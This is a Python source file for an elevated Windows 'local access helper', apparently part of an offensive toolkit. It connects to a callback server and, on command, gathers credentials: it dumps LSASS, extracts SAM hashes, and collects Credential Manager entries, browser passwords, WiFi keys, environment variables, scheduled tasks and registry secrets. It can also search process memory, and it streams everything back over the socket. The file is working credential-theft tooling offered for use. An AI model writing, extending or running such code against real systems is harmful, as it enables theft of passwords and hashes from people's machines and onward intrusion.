"""
T Local Access Helper — runs as an elevated subprocess.
Spawned by escalation.py via ShellExecuteW runas (UAC prompt).
Connects back to brain's TCP callback server, receives commands, returns results.

Usage (internal — not called directly):
    python helper.py --port PORT --token TOKEN
"""

import argparse
import json
import os
import socket
import sys

# Ensure brain package is importable when running as __main__
_HERE = os.path.dirname(os.path.abspath(__file__))
_BRAIN = os.path.dirname(_HERE)
if _BRAIN not in sys.path:
    sys.path.insert(0, _BRAIN)


def _send(sock: socket.socket, payload: dict) -> None:
    """Send a JSON-line over the socket."""
    data = (json.dumps(payload) + "\n").encode("utf-8")
    sock.sendall(data)


def _recv(sock: socket.socket, buf: bytearray) -> dict | None:
    """Read one JSON line from the socket. Returns None on disconnect."""
    while b"\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            return None
        buf.extend(chunk)
    line, rest = buf.split(b"\n", 1)
    buf.clear()
    buf.extend(rest)
    return json.loads(line.decode("utf-8"))


def _run_extraction(sock: socket.socket, session_key_hex: str) -> None:
    """Execute the full credential extraction and send results back."""
    from local_access.credential import (
        dump_lsass, extract_sam, dump_credential_manager,
        extract_browser_creds, extract_wifi, scan_env_vars,
        inspect_scheduled_tasks, scan_registry,
    )

    key = bytes.fromhex(session_key_hex)
    all_hashes: list[str] = []

    sources = [
        ("LSASS",             lambda: _run_lsass(key, all_hashes)),
        ("SAM",               lambda: _run_sam(key, all_hashes)),
        ("Credential Manager",lambda: dump_credential_manager()),
        ("Browsers",          lambda: extract_browser_creds()),
        ("WiFi",              lambda: extract_wifi()),
        ("Env Vars",          lambda: scan_env_vars()),
        ("Scheduled Tasks",   lambda: inspect_scheduled_tasks()),
        ("Registry",          lambda: scan_registry()),
    ]

    full_output_parts = []

    for name, fn in sources:
        _send(sock, {"type": "progress", "source": name, "status": "running"})
        try:
            data = fn()
            _send(sock, {"type": "progress", "source": name, "status": "done"})
            full_output_parts.append(f"\n{'='*40}\n{name}\n{'='*40}\n{data}")
            _send(sock, {"type": "result", "source": name, "data": data})
        except Exception as e:
            _send(sock, {"type": "progress", "source": name, "status": "failed"})
            _send(sock, {"type": "error",    "source": name, "error": str(e)})

    if all_hashes:
        _send(sock, {"type": "hashes", "hashes": list(set(all_hashes))})

    _send(sock, {"type": "done", "full_output": "\n".join(full_output_parts)})


def _run_lsass(key: bytes, hashes: list) -> str:
    from local_access.credential import dump_lsass
    r = dump_lsass(key)
    if r.get("error"):
        return f"Error: {r['error']}"
    hashes.extend(r.get("hashes", []))
    method = r.get("method", "unknown")
    return f"Method: {method}\n{r.get('data', '')}"


def _run_sam(key: bytes, hashes: list) -> str:
    from local_access.credential import extract_sam
    r = extract_sam(key)
    if r.get("error"):
        return f"Error: {r['error']}"
    hashes.extend(r.get("hashes", []))
    return r.get("data", "")


def _run_memory_inspect(sock: socket.socket, cmd: dict) -> None:
    from local_access.memory_inspector import MemoryInspector
    insp = MemoryInspector()
    pid  = cmd.get("pid")
    pats = cmd.get("patterns")

    if pid:
        result = insp.inspect_process(int(pid), pats)
        _send(sock, {"type": "memory_inspect_result", "id": cmd.get("id"), "result": result})
    else:
        results = insp.search_all_processes(pats)
        _send(sock, {"type": "memory_inspect_result", "id": cmd.get("id"), "results": results})


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port",  type=int, required=True)
    parser.add_argument("--token", type=str, required=True)
    args = parser.parse_args()

    try:
        sock = socket.create_connection(("127.0.0.1", args.port), timeout=10)
    except Exception as e:
        sys.exit(f"[helper] Could not connect to brain: {e}")

    # Authenticate with session token
    _send(sock, {"type": "hello", "token": args.token})

    buf = bytearray()
    try:
        while True:
            cmd = _recv(sock, buf)
            if cmd is None:
                break

            t = cmd.get("type")
            if t == "extract_all":
                _run_extraction(sock, cmd["session_key"])
            elif t == "memory_inspect":
                _run_memory_inspect(sock, cmd)
            elif t == "ping":
                _send(sock, {"type": "pong"})
            elif t == "end":
                break
    except Exception as e:
        _send(sock, {"type": "fatal_error", "error": str(e)})
    finally:
        sock.close()


if __name__ == "__main__":
    main()
